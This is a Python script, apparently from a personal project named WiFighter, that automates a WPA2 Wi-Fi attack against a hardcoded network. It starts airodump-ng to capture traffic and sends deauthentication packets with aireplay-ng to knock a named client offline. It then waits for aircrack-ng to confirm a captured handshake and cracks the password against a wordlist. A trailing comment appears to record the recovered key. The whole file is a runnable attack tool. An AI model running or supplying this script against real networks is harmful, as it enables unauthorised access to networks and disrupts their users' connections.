#!venv/bin/python

import os, sys, subprocess, time
#import threading
import multiprocessing

interface = "wlp1s0mon"

ssid = "Test_Wifi"
bssid = "42:ed:00:17:e0:d8"
channel = "5"

client_mac = "9a:23:6b:36:1f:1b"
deauth_type = "client"

output_dir = f"/home/filip/Coding/WiFighter/attacks/{ssid}"
output_file = f"{output_dir}/handshake"
#output_file = f"/home/filip/Coding/WiFighter/attacks/{ssid}/handshake"

# Run airodump-ng
def run_airodump(interface, bssid, channel, output_file):
    if interface and bssid and channel and output_file:
        #os.system(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface} > /dev/null 2>&1")
        command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', output_file, interface]
        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Run aireplay-ng
def run_aireplay(interface, bssid, client_mac, deauth_type):
    if interface and bssid and client_mac and deauth_type:
        if deauth_type == "client":
            if client_mac:
                #os.popen(f"sudo aireplay-ng -0 1 -a {bssid} -c {client_mac} {interface}")
                command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', client_mac, interface]
                subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif deauth_type == "broadcast":
            os.popen(f"sudo aireplay-ng -0 1 -a {bssid} {interface}")

# Define processes
capture_handshake = multiprocessing.Process(target = run_airodump, args=(interface, bssid, channel, output_file))
deauth_client = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, client_mac, deauth_type))

# Listen for handshake
capture_handshake.start() # Start airodump-ng process
time.sleep(2)

# Deauth client/s
deauth_client.start() # Start aireplay-ng process
deauth_client.join() # Wait for the process to stop
print(f"[1] Deauth packet send to client {client_mac}")

# Wait and verify that handshake was captured successfuly
captured = False
print('[2] Waiting for handshake...')
while not captured:
    if os.path.exists(f"{output_file}-01.cap"):
        #verify = os.popen(f"sudo aircrack-ng {output_file}-01.cap").read()
        command = ['sudo', 'aircrack-ng', f'{output_file}-01.cap']
        verify = subprocess.Popen(command, stdout=subprocess.PIPE, text=True)
        output = str(verify.communicate())
        if "(0 handshake)" not in output and "Unknown" not in output:
            print("[3] Handshake/s captured!")
            captured = True
    time.sleep(1)

capture_handshake.kill() # Stop airodump-ng process
capture_handshake.join() # Wait for the process to stop

os.system(f"sudo aircrack-ng -w wordlist.txt {output_file}-01.cap") # Crack password




#  {'SSID': 'Test_Wifi', 'BSSID': '42:ed:00:17:e0:d8', 'Channel': '5', 'Signal': '-46', 'Band': '2.4 GHz', 'Encryption': 'WPA2', 'Auth': 'PSK', 'Cipher': 'CCMP'}
#  9a:23:6b:36:1f:1b
#  81203666
